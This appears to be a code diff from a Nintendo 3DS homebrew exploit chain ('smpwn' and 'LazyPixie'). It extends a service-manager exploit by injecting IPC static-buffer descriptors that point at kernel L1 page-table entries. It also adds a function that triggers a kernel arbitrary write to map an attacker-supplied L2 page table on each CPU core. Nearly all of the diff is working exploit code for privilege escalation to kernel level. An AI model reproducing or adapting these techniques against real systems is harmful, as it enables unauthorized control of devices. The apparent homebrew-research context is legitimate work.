@@ -4,7 +4,7 @@
 
 #define SMPWN_VICTIM_SERVICE_NAME           "pxi:dev"
 #define SMPWN_VICTIM_SERVICE_MAX_SESSIONS   2
-#define SMPWN_THREAD_STACK_SIZE             0x200
+#define SMPWN_THREAD_STACK_SIZE             0x80
 
 typedef struct SmConstants {
     u32 tlsAddr;
@@ -250,12 +250,33 @@ Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
     // Seems like cleaning up by unregistering ports makes sm crash, so let's not do it.
 
     // At this point nothing can fail anymore.
-    // Quickly put the static bufs into a sane state
+    // Quickly put the static bufs into a sane state.
+    // Also prepare LazyPixie buffers for < 11.12.
     u32 staticBufs[16*2] = {
         IPC_Desc_StaticBuffer(0x110, 0), // Original static buffer for srv:pm RegisterProcess
         s_constants.staticBuffer0Addr,
+
         IPC_Desc_StaticBuffer(16*8, 1),
         staticBufsAddr, // our backdoor
+
+        IPC_Desc_StaticBuffer(0, 2),
+        0, // empty
+
+        // Here we create a MMU entry, L1 entry mapping a page table (client will set bits 1 and 0 accordingly),
+        // to map MAP_ADDR.
+        // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
+
+        IPC_Desc_StaticBuffer(0, 3),
+        KERNPA2VA(0x1FFF8000) + (KHC3DS_MAP_ADDR >> 20) * 4,
+
+        IPC_Desc_StaticBuffer(0, 4),
+        KERNPA2VA(0x1FFFC000) + (KHC3DS_MAP_ADDR >> 20) * 4,
+
+        IPC_Desc_StaticBuffer(0, 5),
+        KERNPA2VA(0x1F3F8000) + (KHC3DS_MAP_ADDR >> 20) * 4,
+
+        IPC_Desc_StaticBuffer(0, 6),
+        KERNPA2VA(0x1F3FC000) + (KHC3DS_MAP_ADDR >> 20) * 4,
     };
 
     smWriteStaticBufferData(ctx, staticBufs, sizeof(staticBufs), 0);
@@ -281,6 +302,7 @@ Result smWriteData(const SmpwnContext *ctx, u32 smDst, const void *src, size_t s
         s_constants.tlsAddr + 0x180, // our backdoor
         IPC_Desc_StaticBuffer(size, 2),
         smDst,
+        // LazyPixie staticbufs not overwritten
     };
 
     TRY(smWriteStaticBufferData(ctx, staticBufs, sizeof(staticBufs), 1));
@@ -306,6 +328,26 @@ Result smRemoveRestrictions(const SmpwnContext *ctx)
 
     TRY(smWriteData(ctx, s_constants.nbSrvPmSessionsAddr, &nbSrvPmSessions, 4));
     TRY(smWriteData(ctx, s_constants.nbKipsAddr, &nbKips, 2));
+
+    return res;
+}
+
+Result smMapL2TableViaLazyPixie(const SmpwnContext *ctx, const BlobLayout *layout)
+{
+    Result res = 0;
+    u32 *cmdbuf = getThreadCommandBuffer();
+    u32 baseSbufId = 3;
+
+    // We assume our static buffers descriptors have already been injected
+    // Trigger the kernel arbwrite
+    u32 numCores = IS_N3DS ? 4 : 2;
+    cmdbuf[0] = IPC_MakeHeader(0xCAFE, 0, 2 * numCores);
+    for (u32 i = 0; i < numCores; i++) {
+        cmdbuf[1 + 2 * i]       = IPC_Desc_PXIBuffer(4, baseSbufId + i, false);
+        cmdbuf[1 + 2 * i + 1]   = (u32)layout->l2table | 1; // P=0 Domain=0000 (client), coarse page table
+    }
+
+    TRY(svcSendSyncRequest(ctx->srvHandle));
 
     return res;
 }
